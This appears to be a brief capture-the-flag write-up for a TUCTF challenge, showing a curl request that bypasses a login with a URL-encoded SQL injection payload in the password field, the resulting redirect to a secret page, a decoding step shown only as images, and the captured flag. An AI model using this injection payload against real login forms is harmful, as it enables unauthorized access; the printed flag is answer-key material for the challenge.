A simple SQL Injection challenge:
```
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Mon Jan 27, 21:10]
└─[$] <> curl -X POST 'https://my-first-secret.tuctf.com/login' --data "username=admin&password=%27or%271%27%3D%271"
 
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/secret">/secret</a>. If not, click the link.
```

The `/secret` path give us a simple cripto challenge

![alt text](img/image-1.png)

Decode it using this

![alt text](img/image-2.png)

Flag: `TUCTF{there_is_always_another_secret}`